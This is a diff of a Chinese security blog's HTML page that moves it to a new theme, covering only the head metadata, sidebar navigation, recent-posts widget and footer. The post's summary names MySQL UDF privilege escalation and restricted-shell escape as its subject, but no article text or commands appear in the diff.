@@ -1,457 +1,149 @@
-<!DOCTYPE HTML>
-<html lang="zh-CN">
 
+<!DOCTYPE html><html lang="zh-CN">
 
 <head>
-    <meta charset="utf-8">
-    <meta name="keywords" content="权限提升学习, hybcx&#39;s blog">
-    <meta name="description" content="0x01 前言
-本文的来源主要是上一次刷vulnhub靶场所遗留的问题，本着哪里不懂学哪里的精神而撰写的本文，这次主要学习一下MySQL udf提权以及如何逃逸restricted shell（受限制的shell，也称lshell）。
-最后">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta name="renderer" content="webkit|ie-stand|ie-comp">
-    <meta name="mobile-web-app-capable" content="yes">
-    <meta name="format-detection" content="telephone=no">
-    <meta name="referrer" content="no-referrer-when-downgrade">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="referrer" content="no-referrer-when-downgrade">
-    <!-- Global site tag (gtag.js) - Google Analytics -->
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
+  
+  <meta name="generator" content="Hexo 7.2.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  
+  <title>权限提升学习 - hybcx's blog</title>
 
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BYTY196ENH"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
+  
+    <meta name="description" content="0x01 前言 本文的来源主要是上一次刷vulnhub靶场所遗留的问题，本着哪里不懂学哪里的精神而撰写的本文，这次主要学习一下MySQL udf提权以及如何逃逸restricted shell（受限制的shell，也称lshell）。 最后会浅浅学习一下内网渗透时的一些常用工具的命令学习，废话不多说，直接开卷！！！ 0x02 MySQL-udf 提权 2.1 简介 UDF（user defind">
+<meta property="og:type" content="article">
+<meta property="og:title" content="权限提升学习">
+<meta property="og:url" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/index.html">
+<meta property="og:site_name" content="hybcx&#39;s blog">
+<meta property="og:description" content="0x01 前言 本文的来源主要是上一次刷vulnhub靶场所遗留的问题，本着哪里不懂学哪里的精神而撰写的本文，这次主要学习一下MySQL udf提权以及如何逃逸restricted shell（受限制的shell，也称lshell）。 最后会浅浅学习一下内网渗透时的一些常用工具的命令学习，废话不多说，直接开卷！！！ 0x02 MySQL-udf 提权 2.1 简介 UDF（user defind">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925193740072.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925195617350.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925195858624.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925200105640.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925200241394.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925201457620.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925201646050.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925201736284.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925201847107.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925201939661.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925202112099.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925202546055.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925202705267.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925203656117.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925203714767.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925204934434.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925205014663.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925205239370.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925205329215.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925205929909.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925205942481.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925210437927.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925213019476.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925213258213.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925212003551.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925212222362.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925212342687.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925212506400.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925212544397.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925212649664.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925213925995.png">
+<meta property="article:published_time" content="2023-09-25T11:17:51.329Z">
+<meta property="article:modified_time" content="2023-09-25T13:46:39.615Z">
+<meta property="article:author" content="hybcx">
+<meta property="article:tag" content="数据库提权系列">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/image-20230925193740072.png">
+  
+  
+  
+  <meta name="keywords" content="数据库提权系列">
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.28.1">
+
+  
+
+  
     
-      gtag('config', 'G-BYTY196ENH');
-    </script>
+<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">
 
+  
 
-    <title>权限提升学习 | hybcx&#39;s blog</title>
-    <link rel="icon" type="image/png" href="/favicon.png">
-    
+  <script>
+  if (window.localStorage.getItem('ZYI_Theme_Mode')==='dark' || (window.localStorage.getItem('ZYI_Theme_Mode')==='Moss' && window.matchMedia('(prefers-color-scheme: dark)').matches)){
+      document.querySelector("html").id = "ZYDark";
+  }
+</script>
+<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/custom/css/ZYDark.css">
 
-
-    <!-- bg-cover style     -->
-
-
-
-<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
-<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
-<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
-<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
-<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
-<link rel="stylesheet" type="text/css" href="/css/matery.css">
-<link rel="stylesheet" type="text/css" href="/css/my.css">
-<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
-
-
-
-
-    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
-    <link rel="stylesheet" href="/css/post.css">
-
-
-
-
-    
-        <link rel="stylesheet" type="text/css" href="/css/reward.css">
-    
-
-
-
-    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
-
-<meta name="generator" content="Hexo 7.2.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 </head>
-
-
 <body>
-    <header class="navbar-fixed">
-    <nav id="headNav" class="bg-color nav-transparent">
-        <div id="navContainer" class="nav-wrapper container">
-            <div class="brand-logo">
-                <a href="/" class="waves-effect waves-light">
-                    
-                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
-                    
-                    <span class="logo-span diyFont">hybcx&#39;s blog</span>
-                </a>
-            </div>
-            
 
-<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
-<ul class="right nav-menu">
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/" class="waves-effect waves-light">
-      
-      <i class="fas fa-home" style="zoom: 0.6;"></i>
-      
-      <span>首页</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>标签</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/archives" class="waves-effect waves-light">
-      
-      <i class="fas fa-archive" style="zoom: 0.6;"></i>
-      
-      <span>归档</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>留言板</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/friends" class="waves-effect waves-light">
-      
-      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
-      
-      <span>友情链接</span>
-    </a>
-    
-  </li>
-  
-  <li>
-    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
-      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
-    </a>
-  </li>
-  <li>
-    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
-      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
-    </a>
-  </li>
-</ul>
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
 
 
-<div id="mobile-nav" class="side-nav sidenav">
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/logo.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 奈何却无能</div></a></div></header>
 
-    <div class="mobile-head bg-color">
-        
-        <img src="/medias/logo.png" class="logo-img circle responsive-img">
-        
-        <div class="logo-name">hybcx&#39;s blog</div>
-        <div class="logo-desc">
-            
-            Never really desperate, only the lost of the soul.
-            
-        </div>
-    </div>
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
 
-    <ul class="menu-list mobile-menu-list">
-        
-        <li class="m-nav-item">
-	  
-		<a href="/" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-home"></i>
-			
-			首页
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/archives" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-archive"></i>
-			
-			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			留言板
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/friends" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-address-book"></i>
-			
-			友情链接
-		</a>
-          
-        </li>
-        
-        
-        <li><div class="divider"></div></li>
-        <li>
-            <a href="https://github.com/hybchenxing/" class="waves-effect waves-light" target="_blank">
-                <i class="fab fa-github-square fa-fw"></i>Fork Me
-            </a>
-        </li>
-        
-    </ul>
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
 </div>
+<div class="widgets">
 
 
-        </div>
-
-        
-            <style>
-    .nav-transparent .github-corner {
-        display: none !important;
-    }
-
-    .github-corner {
-        position: absolute;
-        z-index: 10;
-        top: 0;
-        right: 0;
-        border: 0;
-        transform: scale(1.1);
-    }
-
-    .github-corner svg {
-        color: #0f9d58;
-        fill: #fff;
-        height: 64px;
-        width: 64px;
-    }
-
-    .github-corner:hover .octo-arm {
-        animation: a 0.56s ease-in-out;
-    }
-
-    .github-corner .octo-arm {
-        animation: none;
-    }
-
-    @keyframes a {
-        0%,
-        to {
-            transform: rotate(0);
-        }
-        20%,
-        60% {
-            transform: rotate(-25deg);
-        }
-        40%,
-        80% {
-            transform: rotate(10deg);
-        }
-    }
-</style>
-
-<a href="https://github.com/hybchenxing/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
-   data-tooltip="Fork Me" data-position="left" data-delay="50">
-    <svg viewBox="0 0 250 250" aria-hidden="true">
-        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
-        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
-              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
-        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
-              fill="currentColor" class="octo-body"></path>
-    </svg>
-</a>
-        
-    </nav>
-
-</header>
-
-    
-
-
-
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
-    <div class="container" style="right: 0px;left: 0px;">
-        <div class="row">
-            <div class="col s12 m12 l12">
-                <div class="brand">
-                    <h1 class="description center-align post-title">权限提升学习</h1>
-                </div>
-            </div>
-        </div>
-    </div>
+<widget class="widget-wrapper slide-up post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/04/30/hnctf-2022/"><span class="title">HNCTF2022</span></a><a class="item title" href="/2024/03/26/gdouctf-2023/"><span class="title">GDOUCTF2023</span></a><a class="item title" href="/2024/05/02/misc-shua-ti-zhi-lu/"><span class="title">MISC-刷题之旅</span></a><a class="item title" href="/2024/03/24/shell-xue-xi/"><span class="title">shell学习</span></a><a class="item title" href="/2023/08/06/qian-xi-ssti-lou-dong/"><span class="title">浅析SSTI漏洞</span></a><a class="item title" href="/2024/03/29/thm-jin-gong-xing-shen-tou-ce-shi/"><span class="title">THM-进攻性渗透测试</span></a><a class="item title" href="/2023/11/12/flask-pin-ma-xue-xi/"><span class="title">Flask-PIN码学习</span></a><a class="item title" href="/2024/04/23/php-xue-xi-zong-jie/"><span class="title">PHP学习总结</span></a><a class="item title" href="/2024/04/15/uuctf-2022/"><span class="title">UUCTF_2022</span></a><a class="item title" href="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/"><span class="title">i春秋CTF刷题</span></a></div></widget>
 </div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
+</div></aside><div class="l_main" id="main">
 
 
 
 
-<main class="post-container content">
 
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2023-09-25T11:17:51.329Z">2023-09-25</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2023-09-25T13:46:39.615Z">2023-09-25</time></span></div></div></div>
     
-    <div class="row">
-    <div id="main-content" class="col s12 m12 l9">
-        <!-- 文章内容详情 -->
